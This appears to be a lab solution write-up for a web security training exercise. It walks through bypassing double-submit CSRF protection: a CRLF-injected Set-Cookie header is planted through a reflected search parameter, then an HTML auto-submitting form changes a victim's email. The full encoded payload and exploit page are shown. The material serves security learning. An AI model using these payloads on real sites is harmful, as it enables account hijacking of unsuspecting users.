## Solution steps

- Login using the provided credentials.
- Open Burp Suite and set-up proxy.
- Submit the "Update email" form, and find the resulting request in your Proxy history.
- Send the request to repeater and observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie.
- Perform a search, send the resulting request to Burp Repeater, and observe in the response that the search term gets reflected in the Set-Cookie header: `Set-Cookie: LastSearchTerm=hello; Secure; HttpOnly`
- Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
- Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:
  ```
  test
  Set-Cookie: csrf=fake; SameSite=None
  ```
- URL encode it using https://gchq.github.io/CyberChef/
- Thw final payload should look like this: `test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
- On Burp suite, turn the intercept ON and search a random string.
- Replace the string with our URL encoded payload: `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
- Forward the request, go to developer tools and in the application tab you can notice that the csrf cookie's value is now set as "fake".
- Copy the contents of the `POST` request `/my-account/change-email` and paste it in an online CSRF PoC Generator. I used: https://hacktify.in/csrf/
- Generate PoC form and change the csrf value to `fake` to match our csrf cookie value.
- Change the email address in your exploit so that it doesn't match your own.
- Instead of writing `<script>document.forms[0].submit();</script>` to submit the form, add the following code to inject the cookie:
  `<img src="https://xxxxx.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
- Your final exploit must look like this:
  ```
  <html>
  	<body>
  		<form method="POST" action="https://xxxxx.web-security-academy.net/my-account/change-email">
  			<input type="hidden" name="email" value="pentester@gmail.com"/>
  			<input type="hidden" name="csrf" value="fake"/>
  			<input type="submit" value="Submit">
  		</form>
  <img src="https://xxxxx.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  	</body>
  <html>
  ```
- Store the exploit, then click "Deliver to victim" to solve the lab.
